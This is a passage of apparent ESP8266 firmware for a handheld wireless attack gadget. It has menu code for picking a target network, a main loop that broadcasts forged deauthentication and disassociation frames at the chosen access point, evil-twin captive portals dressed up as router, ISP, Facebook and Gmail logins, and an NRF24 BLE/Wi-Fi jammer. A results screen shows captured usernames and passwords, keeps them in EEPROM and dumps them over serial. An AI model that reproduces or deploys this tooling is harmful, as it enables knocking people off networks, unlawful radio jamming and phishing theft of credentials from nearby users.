   BUG FIX: was redrawing every loop iteration — now dirty-flag driven
   ================================================================ */
void drawStatusMenu() {
  spiStop();
  display.clearDisplay();
  drawHeader("   Status");
  display.setTextSize(1); display.setTextColor(WHITE);

  display.setCursor(CONTENT_X, 13);
  display.print("Tgt:");
  if (_selectedNetwork.ssid == "") {
    display.print("(none)");
  } else {
    char ssidBuf[33]; strncpy(ssidBuf, _selectedNetwork.ssid.c_str(), 32); ssidBuf[32]='\0';
    if ((int)_selectedNetwork.ssid.length() <= 14) {
      display.print(ssidBuf);
    } else {
      char p1[15]; strncpy(p1, ssidBuf, 14); p1[14]='\0';
      display.print(p1);
      display.setCursor(CONTENT_X, 23); display.print("    "); display.print(ssidBuf + 14);
    }
  }

  display.setCursor(CONTENT_X, 33);
  display.print("Deauth:"); display.print(deauth_active ? "ON " : "OFF");
  display.print(" Twin:"); display.print(hotspot_active ? "ON" : "OFF");

  display.setCursor(CONTENT_X, 43);
  const char* tn[] = { "Router", "ISP", "WiFi", "FB", "Gmail", "GWifi", "JLB", "SM" };
  display.print("Theme:"); display.print(tn[portalTheme]);
  if (hotspot_active) { display.print(" Cli:"); display.print((int)WiFi.softAPgetStationNum()); }
  if (combo_active)   { display.print(" CMB"); }

  display.setCursor(CONTENT_X, 53);
  display.print("Jam:");
  if (jammerRunning) {
    const char* js[] = { "BLE", "WiFi" };
    display.print(js[jamMode]); display.print(" ch"); display.print(radioChannel);
  } else { display.print("OFF"); }

  display.display();
  spiStart();
  statusDirty = false;
}

/* ================================================================
   RESULT MENU
   ================================================================ */
void drawResultMenu() {
  spiStop();
  display.clearDisplay();
  drawHeader("   Results");
  display.setTextSize(1); display.setTextColor(WHITE);

  if (_correct == "") {
    display.setCursor(CONTENT_X, 13); display.print("No result yet.");
    display.setCursor(CONTENT_X, 23); display.print("Run EvilTwin first.");
    display.setCursor(CONTENT_X, 35); display.print("(Loads from EEPROM");
    display.setCursor(CONTENT_X, 45); display.print(" on boot too)");
    display.setCursor(CONTENT_X, 57); display.print("[UP/DN]=back");
  } else {
    int y = 13;
    char ssidLabel[40]; snprintf(ssidLabel, sizeof(ssidLabel), "SSID:%s", _selectedNetwork.ssid.c_str());
    char passLabel[72]; snprintf(passLabel, sizeof(passLabel), "PASS:%s", _correct.c_str());
    y = printWrapped(ssidLabel, CONTENT_X, y, 9);
    if (_capturedUser.length() > 0) {
      char userLabel[72]; snprintf(userLabel, sizeof(userLabel), "USER:%s", _capturedUser.c_str());
      y = printWrapped(userLabel, CONTENT_X, y, 9);
    }
    y = printWrapped(passLabel, CONTENT_X, y, 9);
    display.setCursor(CONTENT_X, y); display.print("Tries:"); display.print(_attemptCount); y += 9;
    if (y <= 48) { display.setCursor(CONTENT_X, y); display.print("[SEL]=Dump serial"); y += 9; }
    if (y <= 57) { display.setCursor(CONTENT_X, y); display.print("[UP/DN]=back"); }
  }
  display.display();
  spiStart();
}

/* ================================================================
   RADIO MENU
   ================================================================ */
#define RADIO_ITEMS 3   // BLE Jam | WiFi Jam | Back

void drawRadioMenu() {
  spiStop();
  display.clearDisplay();
  drawHeader(" RF Jammer");
  int startY = HDR_H + 1;

  char modeLabels[2][26];
  for (int i = 0; i < 2; i++) {
    bool active = (jammerRunning && (int)jamMode == i);
    snprintf(modeLabels[i], sizeof(modeLabels[i]), "%s %s",
             active ? "[ON] " : "[OFF]", jamModeLabels[i]);
  }
  const char* items[RADIO_ITEMS] = { modeLabels[0], modeLabels[1], "< Back" };
  for (int i = 0; i < RADIO_ITEMS; i++)
    drawMenuRow(startY + i * ROW_H, i == radioSel, items[i]);

  if (!radioOk) {
    display.setCursor(CONTENT_X, HDR_H + RADIO_ITEMS * ROW_H + 2);
    display.setTextColor(WHITE); display.print("! NRF not found");
  }
  display.display();
  spiStart();
}

/* ================================================================
   BLE SCAN (with animated pulse loading screen)
   ================================================================ */
void performBLEScan() {
  spiStop();

  if (!radioOk) {
    bleScanDone = true;
    for (int i = 0; i < 3; i++)
      bleResults[i] = { BLE_CH_NRF[i], BLE_CH_BLE[i], 0, 0 };
    return;
  }

  bool wasJamming = jammerRunning;
  JamMode prevMode = jamMode;
  if (wasJamming) { radio.stopConstCarrier(); radio.powerDown(); jammerRunning = false; }

  SPI.begin(); delay(5);
  radio.begin();
  radio.setAutoAck(false); radio.setRetries(0, 0);
  radio.setPALevel(RF24_PA_MAX); radio.setDataRate(RF24_2MBPS);
  radio.setCRCLength(RF24_CRC_DISABLED); radio.setPayloadSize(32); radio.setAddressWidth(3);

  for (int i = 0; i < 3; i++) {
    // Animated BLE pulse loading for each channel
    animateBLEPulse(i);

    bleResults[i].nrfChannel = BLE_CH_NRF[i];
    bleResults[i].bleChannel = BLE_CH_BLE[i];
    bleResults[i].hits       = 0;
    bleResults[i].rssi       = -99;

    radio.setChannel(BLE_CH_NRF[i]);
    radio.startListening(); delay(5);

    unsigned long start = millis();
    uint8_t hitCount = 0;
    while (millis() - start < BLE_SCAN_MS) {
      if (radio.testRPD()) {
        hitCount++; if (hitCount > 99) hitCount = 99;
        bleResults[i].rssi = -64;
      }
      if (radio.available()) {
        uint8_t buf[32]; radio.read(buf, 32);
        hitCount++; bleResults[i].rssi = -55;
      }
      ESP.wdtFeed();  // BUG FIX: was missing, could trigger WDT reset on long scan
      delay(10);
    }
    radio.stopListening();
    bleResults[i].hits = hitCount;
  }

  radio.powerDown(); SPI.end();

  if (wasJamming) {
    SPI.begin(); radio.begin();
    radio.setAutoAck(false); radio.setRetries(0, 0);
    radio.setPayloadSize(5); radio.setAddressWidth(3);
    radio.setPALevel(RF24_PA_MAX); radio.setDataRate(RF24_2MBPS);
    radio.setCRCLength(RF24_CRC_DISABLED);
    startJammer(prevMode);
  }
  bleScanDone = true;
}

void drawBLEMenu() {
  spiStop();
  display.clearDisplay();
  display.setTextSize(1);

  // ── Header ───────────────────────────────────────────────────
  display.fillRect(0, 0, SCREEN_WIDTH, HDR_H, WHITE);
  display.setTextColor(BLACK);
  display.setCursor(2, 1);
  display.print("BLE Scan");
  if (bleScanDone) { display.setCursor(74, 1); display.print("Done"); }
  else             { display.setCursor(68, 1); display.print("No scan"); }
  display.setTextColor(WHITE);

  if (!radioOk) {
    display.setCursor(CONTENT_X, HDR_H + 8);  display.print("NRF24 not found!");
    display.setCursor(CONTENT_X, HDR_H + 20); display.print("Check SPI wiring.");
    display.setCursor(CONTENT_X, HDR_H + 40); display.print("SELECT: back");
    display.display(); spiStart(); return;
  }

  // ── Column header ────────────────────────────────────────────
  display.setCursor(CONTENT_X, HDR_H + 2);
  display.print("CH   Hits  Sig  RSSI");

  // ── Channel rows ─────────────────────────────────────────────
  for (int i = 0; i < 3; i++) {
    int y    = HDR_H + 12 + i * 12;
    bool sel = (i == bleSel);

    if (sel) {
      display.fillRect(0, y - 1, SCREEN_WIDTH, 11, WHITE);
      display.setTextColor(BLACK);
    } else {
      display.setTextColor(WHITE);
    }

    const char* sig;
    if (!bleScanDone)                sig = "---";
    else if (bleResults[i].hits == 0) sig = "None";
    else if (bleResults[i].hits < 5)  sig = "Weak";
    else if (bleResults[i].hits < 20) sig = "Med ";
    else                              sig = "Strg";

    char row[24];
    snprintf(row, sizeof(row), "%2d  %3d   %s",
             bleResults[i].bleChannel,
             bleScanDone ? bleResults[i].hits : 0,
             sig);
    display.setCursor(CONTENT_X, y);
    display.print(row);

    // RSSI bars on right (only when scan done and hits > 0)
    if (bleScanDone && bleResults[i].hits > 0) {
      // Fake RSSI from hit count for visual interest
      int8_t fakeRssi = (bleResults[i].hits >= 20) ? -55 :
                        (bleResults[i].hits >= 5)  ? -70 : -85;
      if (sel) {
        // Draw inverted bars (black on white)
        int bars = (fakeRssi > -60) ? 4 : (fakeRssi > -70) ? 3 : (fakeRssi > -80) ? 2 : 1;
        for (int b = 0; b < 4; b++) {
          int bx = 108 + b * 4;
          int bh = 2 + b * 2;
          int by = y + 8 - bh;
          if (b < bars) display.fillRect(bx, by, 3, bh, BLACK);
          else          display.drawRect(bx, by, 3, bh, BLACK);
        }
      } else {
        drawRssiBars(108, y, fakeRssi);
      }
    }

    display.setTextColor(WHITE);
  }

  // ── Back row ─────────────────────────────────────────────────
  int backY    = HDR_H + 12 + 3 * 12;
  bool backSel = (bleSel == 3);
  if (backSel) {
    display.fillRect(0, backY - 1, SCREEN_WIDTH, 11, WHITE);
    display.setTextColor(BLACK);
  } else {
    display.setTextColor(WHITE);
  }
  display.setCursor(CONTENT_X, backY);
  display.print("< Back  [SEL=rescan]");
  display.setTextColor(WHITE);

  display.display();
  spiStart();
}

/* ================================================================
   MENU INPUT HANDLERS
   ================================================================ */
void handleMainMenu() {
  // BUG FIX: no wrap-around — clamp so mainTop never has to teleport
  if (bDown.pressed) { if (mainSel < MAIN_COUNT - 1) mainSel++; drawMainMenu(); }
  if (bUp.pressed)   { if (mainSel > 0)              mainSel--; drawMainMenu(); }
  if (bSelect.pressed) {
    switch (mainSel) {
      case 0:  performScan(); netSel = 0; netTop = 0; currentMenu = MENU_NETWORKS; drawNetworkMenu(); break;
      case 1:  if (!networkCount) performScan(); netSel = 0; netTop = 0; currentMenu = MENU_NETWORKS; drawNetworkMenu(); break;
      case 2:  attackSel = 0; currentMenu = MENU_ATTACK; drawAttackMenu(); break;
      case 3:  statusDirty = true; currentMenu = MENU_STATUS; drawStatusMenu(); break;
      case 4:  currentMenu = MENU_RESULT; drawResultMenu(); break;
      case 5:  radioSel = 0; currentMenu = MENU_RADIO; drawRadioMenu(); break;
      case 6:  bleSel = 0; currentMenu = MENU_BLE; performBLEScan(); drawBLEMenu(); break;
      case 7:  // WiFi Monitor
        startWifiMon();
        currentMenu = MENU_WIFI_MON;
        drawWifiMonMenu();
        break;
      case 8:  // BLE Monitor
        if (!radioOk) {
          spiStop(); display.clearDisplay();
          drawHeader(" BLE Monitor");
          display.setTextColor(WHITE);
          display.setCursor(CONTENT_X, 20); display.print("NRF24 not found!");
          display.setCursor(CONTENT_X, 30); display.print("Check SPI wiring.");
          display.display(); spiStart(); delay(1500);
          drawMainMenu(); return;
        }
        startBleMon();
        currentMenu = MENU_BLE_MON;
        drawBleMonMenu();
        break;
    }
  }
}

void handleNetworkMenu() {
  if (!networkCount) {
    if (bUp.pressed || bDown.pressed) { performScan(); netSel = 0; drawNetworkMenu(); }
    if (bSelect.pressed) { currentMenu = MENU_MAIN; drawMainMenu(); }
    return;
  }

  int total = networkCount + 1;

  // Ticker advance — BUG FIX: guard bounds properly
  if (netSel < networkCount) {
    int ssidLen = _networks[netSel].ssid.length();
    if (ssidLen > 13 && millis() - tickerLast > 350) {
      tickerLast = millis();
      int maxOff = ssidLen - 13;
      tickerOffset++;
      // BUG FIX: was allowing overshoot to maxOff+2 causing substring past end
      if (tickerOffset > maxOff) tickerOffset = 0;
      drawNetworkMenu();
    }
  }

  // BUG FIX: no wrap-around — clamp so netTop never has to teleport
  if (bDown.pressed) { if (netSel < total - 1) netSel++; tickerOffset = 0; tickerLast = millis(); drawNetworkMenu(); }
  if (bUp.pressed)   { if (netSel > 0)         netSel--; tickerOffset = 0; tickerLast = millis(); drawNetworkMenu(); }

  if (bSelect.pressed) {
    if (netSel == networkCount) { currentMenu = MENU_MAIN; drawMainMenu(); }
    else {
      _selectedNetwork = _networks[netSel];
      spiStop(); display.clearDisplay();
      drawHeader("Target Set!");
      display.setTextSize(1); display.setTextColor(WHITE);
      int y = printWrapped(_selectedNetwork.ssid.c_str(), CONTENT_X, 13, 9);
      display.setCursor(CONTENT_X, y);
      display.print("CH:"); display.print(_selectedNetwork.ch);
      display.print("  "); display.print((int)_selectedNetwork.rssi); display.print("dBm");
      y += 9;
      display.setCursor(CONTENT_X, y);
      for (int i = 0; i < 6; i++) {
        if (_selectedNetwork.bssid[i] < 0x10) display.print("0");
        display.print(_selectedNetwork.bssid[i], HEX);
        if (i < 5) display.print(":");
      }
      display.display(); spiStart(); delay(1500);
      attackSel = 0; currentMenu = MENU_ATTACK; drawAttackMenu();
    }
  }
}

void handleAttackMenuInput() {
  if (bDown.pressed) { if (attackSel < 4) attackSel++; drawAttackMenu(); }
  if (bUp.pressed)   { if (attackSel > 0) attackSel--; drawAttackMenu(); }

  if (bSelect.pressed) {
    if (attackSel < 3 && _selectedNetwork.ssid == "") {
      spiStop(); display.clearDisplay(); display.setTextColor(WHITE);
      drawHeader("  Attack Panel");
      display.setCursor(10, 24); display.print("No target set!");
      display.setCursor(10, 36); display.print("Select one first.");
      display.display(); spiStart(); delay(1000); drawAttackMenu(); return;
    }
    switch (attackSel) {
      case 0:
        if (!deauth_active) { deauth_active = true; combo_active = false; deauth_now = millis(); drawAttackMenu(); }
        else { stopDeauth(); drawAttackMenu(); } break;
      case 1:
        if (!hotspot_active) { combo_active = false; startEvilTwin(); }
        else { stopEvilTwin(); drawAttackMenu(); } break;
      case 2:
        if (!combo_active) { combo_active = true; startEvilTwin(); }
        else { stopEvilTwin(); drawAttackMenu(); } break;
      case 3: themeSel = (int)portalTheme; currentMenu = MENU_THEME; drawThemeMenu(); break;
      case 4: currentMenu = MENU_MAIN; drawMainMenu(); break;
    }
  }
}

void handleThemeMenu() {
  int total = THEME_COUNT + 1;  // 8 themes + Back
  if (bDown.pressed) { if (themeSel < total - 1) themeSel++; drawThemeMenu(); }
  if (bUp.pressed)   { if (themeSel > 0)         themeSel--; drawThemeMenu(); }
  if (bSelect.pressed) {
    if (themeSel < THEME_COUNT) {
      portalTheme = (PortalTheme)themeSel;
      spiStop(); display.clearDisplay(); display.setTextColor(WHITE);
      drawHeader("Portal Theme");
      display.setCursor(10, 24); display.print("Theme set:");
      display.setCursor(10, 34); display.print(themeNames[portalTheme]);
      display.display(); spiStart(); delay(800);
    }
    currentMenu = MENU_ATTACK; drawAttackMenu();
  }
}

void handleStatusMenu() {
  // BUG FIX: don't redraw every tick — only when dirty
  if (statusDirty) drawStatusMenu();

  if (bSelect.pressed || bUp.pressed || bDown.pressed) {
    currentMenu = MENU_MAIN;
    drawMainMenu();
  }
}

void handleResultMenu() {
  if (bSelect.pressed && _correct != "") {
    Serial.println(F("\n[DUMP] Saved result:"));
    Serial.print(F("  SSID: ")); Serial.println(_selectedNetwork.ssid);
    if (_capturedUser.length() > 0) {
      Serial.print(F("  USER: ")); Serial.println(_capturedUser);
    }
    Serial.print(F("  PASS: ")); Serial.println(_correct);
    Serial.print(F("  Tries: ")); Serial.println(_attemptCount);
    spiStop(); display.clearDisplay();
    drawHeader("Dumped!");
    display.setTextSize(1); display.setTextColor(WHITE);
    display.setCursor(CONTENT_X, HDR_H + 10); display.print("Sent to Serial.");
    display.setCursor(CONTENT_X, HDR_H + 22); display.print("115200 baud.");
    display.display(); spiStart(); delay(1000); drawResultMenu();
  }
  if (bUp.pressed || bDown.pressed) { currentMenu = MENU_MAIN; drawMainMenu(); }
}

void handleBLEMenu() {
  if (bDown.pressed) { if (bleSel < BLE_ITEMS - 1) bleSel++; drawBLEMenu(); }
  if (bUp.pressed)   { if (bleSel > 0)             bleSel--; drawBLEMenu(); }
  if (bSelect.pressed) {
    if (bleSel == BLE_ITEMS - 1) { currentMenu = MENU_MAIN; drawMainMenu(); return; }
    bleScanDone = false; performBLEScan(); drawBLEMenu();
  }
}

void handleRadioMenu() {
  if (bDown.pressed) { if (radioSel < RADIO_ITEMS - 1) radioSel++; drawRadioMenu(); }
  if (bUp.pressed)   { if (radioSel > 0)               radioSel--; drawRadioMenu(); }

  if (bSelect.pressed) {
    if (radioSel == RADIO_ITEMS - 1) { currentMenu = MENU_MAIN; drawMainMenu(); return; }
    if (!radioOk) {
      spiStop(); display.clearDisplay();
      drawHeader(" RF Jammer");
      display.setTextSize(1); display.setTextColor(WHITE);
      display.setCursor(CONTENT_X, HDR_H + 8);  display.print("NRF24 not found!");
      display.setCursor(CONTENT_X, HDR_H + 20); display.print("Check CE/CSN/SPI");
      display.setCursor(CONTENT_X, HDR_H + 32); display.print("wiring.");
      display.display(); spiStart(); delay(1800); drawRadioMenu(); return;
    }
    JamMode selected = (JamMode)radioSel;
    // Toggle: if already running this mode, stop it; otherwise start it
    if (jammerRunning && jamMode == selected) stopJammer();
    else startJammer(selected);
    drawRadioMenu();
  }
}

/* ================================================================
   SETUP
   ================================================================ */
void setup() {
  Serial.begin(115200);
  Serial.println(F("\n[*] AxG Haven v.1 booting..."));

  pinMode(BTN_UP,     INPUT_PULLUP);
  pinMode(BTN_DOWN,   INPUT_PULLUP);
  pinMode(BTN_SELECT, INPUT_PULLUP);

  Wire.begin(14, 12);
  if (!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) {
    Serial.println(F("SSD1306 init failed"));
    for (;;);
  }
  display.setTextSize(1);
  display.setTextColor(WHITE);

  display.clearDisplay();
  display.drawBitmap(32, 0, axgHavenBoot, 128, 64, WHITE);
  display.display();
  delay(2500);

  display.clearDisplay();
  display.setCursor(0, 0);  display.println("[*] AxG Haven v.1");
  display.display(); delay(400);

  EEPROM.begin(EEPROM_SIZE);
  loadFromEEPROM();
  display.setCursor(0, 10);
  if (_correct != "") display.print("[+] EEPROM: loaded");
  else                display.print("[*] EEPROM: empty");
  display.display(); delay(500);

  WiFi.persistent(false);
  WiFi.mode(WIFI_STA);
  WiFi.disconnect(true);
  WiFi.softAPdisconnect(true);
  delay(300);

  display.setCursor(0, 20); display.println("[+] WiFi ready");
  display.display(); delay(400);

  display.setCursor(0, 30); display.println("[*] NRF24 init...");
  display.display();

  SPI.begin();
  if (radio.begin()) {
    radio.setAutoAck(false); radio.stopListening();
    radio.setRetries(0, 0); radio.setPayloadSize(5);
    radio.setAddressWidth(3); radio.setPALevel(RF24_PA_MAX);
    radio.setDataRate(RF24_2MBPS); radio.setCRCLength(RF24_CRC_DISABLED);
    radio.powerDown();
    radioOk = true;
    display.setCursor(0, 40); display.println("[+] NRF24 ready");
    Serial.println(F("[+] NRF24 ready"));
  } else {
    radio.powerDown(); SPI.end();
    radioOk = false;
    display.setCursor(0, 40); display.println("[!] NRF24 not found");
    Serial.println(F("[!] NRF24 not found"));
  }
  display.display(); delay(600);

  display.setCursor(0, 50); display.println("[+] Ready  v5.1");
  display.display(); delay(1800);

  unsigned long t = millis();
  bUp.lastAcceptedMs = bDown.lastAcceptedMs = bSelect.lastAcceptedMs = t;

  drawMainMenu();
}

/* ================================================================
   LOOP
   ================================================================ */
void loop() {
  if (hotspot_active) {
    dnsServer.processNextRequest();
    webServer.handleClient();
  }

  pollButtons();

  switch (currentMenu) {
    case MENU_MAIN:     handleMainMenu();        break;
    case MENU_NETWORKS: handleNetworkMenu();     break;
    case MENU_ATTACK:   handleAttackMenuInput(); break;
    case MENU_THEME:    handleThemeMenu();       break;
    case MENU_STATUS:   handleStatusMenu();      break;
    case MENU_RESULT:   handleResultMenu();      break;
    case MENU_RADIO:    handleRadioMenu();       break;
    case MENU_BLE:      handleBLEMenu();         break;
    case MENU_WIFI_MON: handleWifiMonMenu();     break;
    case MENU_BLE_MON:  handleBleMonMenu();      break;
  }

  // Deauth burst every 100ms
  if (deauth_active && millis() - deauth_now >= 100) {
    wifi_set_channel(_selectedNetwork.ch);
    uint8_t pkt[26] = {
      0xC0, 0x00, 0x00, 0x00,
      0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x07, 0x00
    };
    memcpy(&pkt[10], _selectedNetwork.bssid, 6);
    memcpy(&pkt[16], _selectedNetwork.bssid, 6);
    pkt[0] = 0xC0; wifi_send_pkt_freedom(pkt, 26, 0);
    pkt[0] = 0xA0; wifi_send_pkt_freedom(pkt, 26, 0);
    deauth_now = millis();
  }

  runJammer();
}

/* ================================================================
   BOOT BITMAP (PROGMEM)
   ================================================================ */
const unsigned char axgHavenBoot [] PROGMEM = {
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x1c, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x0f, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x0f, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x0f, 0xe0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0xf0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0xfc, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x20, 0x00, 0x00, 0x00, 0x07, 0xfe, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0xc0, 0x00, 0x00, 0x00, 0x07, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0xc0, 0x00, 0x00, 0x00, 0x07, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x01, 0xc0, 0x00, 0x00, 0x00, 0x07, 0xff, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x02, 0x00, 0x00, 0x00, 0x00, 0x03, 0xff, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x06, 0x80, 0x00, 0x00, 0x01, 0x03, 0xff, 0xe0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x05, 0x00, 0x00, 0x00, 0x00, 0x03, 0xff, 0xe0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x0d, 0x00, 0x00, 0x00, 0x01, 0x03, 0xff, 0xf0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x0c, 0x00, 0x00, 0x01, 0x01, 0x03, 0xff, 0xf8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x1c, 0x00, 0x00, 0x00, 0x07, 0x23, 0xff, 0xf8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x1e, 0x00, 0x00, 0x00, 0x1e, 0xc3, 0xff, 0xfc, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x3e, 0x00, 0x30, 0x00, 0xff, 0xc3, 0xff, 0xfc, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x3f, 0x00, 0x70, 0x03, 0xff, 0xc3, 0xff, 0xfc, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x3f, 0xd0, 0x70, 0x0f, 0xff, 0xc3, 0xff, 0xfe, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x7f, 0xf8, 0x30, 0x1f, 0xff, 0xc3, 0xff, 0xfe, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x7f, 0xf8, 0x30, 0x1f, 0xff, 0xc3, 0xff, 0xfe, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x7f, 0xf8, 0x10, 0x0f, 0xff, 0xc3, 0xff, 0xfe, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x7f, 0xfc, 0x00, 0x0f, 0xff, 0xc3, 0xff, 0xfe, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0xff, 0xfc, 0x00, 0x0f, 0xff, 0x83, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0xff, 0xfc, 0x00, 0x07, 0xff, 0x81, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0xff, 0xfc, 0x00, 0x07, 0xff, 0x01, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0xff, 0xfc, 0x00, 0x03, 0xfc, 0x01, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0xff, 0xfc, 0x00, 0x01, 0xff, 0x01, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0xff, 0xfc, 0x00, 0x01, 0xfe, 0x00, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0xff, 0xf8, 0x00, 0x00, 0x04, 0x01, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0xff, 0xf8, 0x00, 0x00, 0x40, 0x01, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0xff, 0xf8, 0x00, 0x00, 0x00, 0x11, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0xff, 0xfc, 0x00, 0x00, 0x00, 0x20, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x7f, 0xfc, 0x00, 0x0f, 0xf8, 0x60, 0x7f, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x7f, 0xfc, 0x00, 0x3f, 0xfc, 0xea, 0x3f, 0xfe, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x7f, 0xfe, 0x00, 0x7f, 0xfd, 0xcd, 0xdf, 0xfe, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x7f, 0xfe, 0x00, 0xff, 0xff, 0xdf, 0x9f, 0xfe, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x3f, 0xfc, 0x00, 0xff, 0xff, 0xff, 0xbf, 0xfe, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x3f, 0xfc, 0x00, 0xff, 0xff, 0xff, 0xff, 0xfc, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x3f, 0xfc, 0x00, 0xff, 0xff, 0x7f, 0xdf, 0xfc, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x1f, 0xf4, 0x00, 0xff, 0xff, 0x3f, 0xdf, 0xfc, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x1f, 0xf0, 0x00, 0xff, 0xff, 0x8f, 0xff, 0xf8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x1f, 0xf0, 0x00, 0x7f, 0xff, 0x87, 0xff, 0xf8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x0f, 0xe0, 0x00, 0x7f, 0xff, 0x83, 0xff, 0xf0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x07, 0xe0, 0x00, 0x7f, 0xff, 0x83, 0xff, 0xe0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x07, 0xe0, 0x00, 0x3f, 0xff, 0x83, 0xe7, 0xe0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x03, 0xe0, 0x00, 0x3f, 0xff, 0x83, 0xf7, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x01, 0xe0, 0x00, 0x1f, 0xff, 0x83, 0xff, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0xe0, 0x00, 0x0f, 0xff, 0x81, 0xff, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0xe0, 0x00, 0x0f, 0xff, 0x80, 0xfe, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x40, 0x00, 0x0f, 0xff, 0x80, 0x7e, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x0f, 0xff, 0x80, 0x3c, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x0f, 0xff, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x07, 0xff, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x07, 0xff, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
